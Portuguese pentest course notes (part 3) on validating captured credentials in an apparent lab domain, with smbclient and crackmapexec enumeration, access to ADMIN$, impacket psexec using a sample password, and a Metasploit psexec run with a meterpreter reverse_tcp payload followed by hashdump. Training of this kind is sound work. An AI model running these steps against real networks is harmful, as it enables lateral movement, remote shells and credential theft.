<h1 align="center">Validando credenciais - Parte 3 </h1>
<hr>

Uma vez que a gente conseguiu obter credenciais a gente precisa validar elas , saber oque a gente consegue fazer com esse nivel que conseguimos.

A primeira coisa que podemos fazer entao seria fazer uma enumercao usando o <span style='color:var(--mk-color-red)'>smbclient</span> 

```sh
smbclient -L \\<IP> -U usuario -W orionscorp2
```

```ad-note
Precisamos passar o dominio ! "-W"
```

Ok , conseguimos mapear no WKS da Fernanda , mas sera que conseguimos mapear esse tipo de teste no servidor?

```sh
smbclient -L \\<IP DO SERVIDOR> -U usuario -W orionscorp2
```

Outra coisa que podemos fazer tambem pra facilitar e ate ser mais rapido eh utilizar o <span style='color:var(--mk-color-red)'>crackmapexec</span> 

```sh
crackmapexec smb hosts -d <DOMINIO> -u <USUARIO> -p <SENHA>
```

Podemos tentar nos conectar agora aos diretorios

```sh
smbclient //<IPDOHOST>/ADMIN$ -U <USUARIO> -W orionscorp2
```

Essa eh uma primeira enumeracao que podemos fazer para comecarmos a ter uma ideia de  possiveis usuarios.

Agora podemos tentar um psexec no metasploit em um usuario com privilegios de comandos.
Tambem podemos usar o impacket

```sh
python3 /usr/share/doc/python3-impacket/examples/psexec.py orionscorp2/mfernanda:'Jesus123'@172.16.1.253
```
ou
```sh
msf5> search psexec
msf5> use exploit(windows/smb/psexec)
msf5> exploit(windows/smb/psexec) > set RHOSTS <IP>
msf5> exploit(windows/smb/psexec) > set SMBDomain orionscorp2
msf5> exploit(windows/smb/psexec) > set SMBUser mfernanda
msf5> exploit(windows/smb/psexec) > set SMBPass Jesus1999
msf5> exploit(windows/smb/psexec) > show targets
msf5> exploit(windows/smb/psexec) > exploit
msf5> exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/reverse_tcp
msf5> exploit(windows/smb/psexec) > exploit
```

Agora sim , podemos ate usar o `sysinfo` e `hashdump` mas sabemos que nao sao os usuarios de dominio. Continuamos na proxima aula.

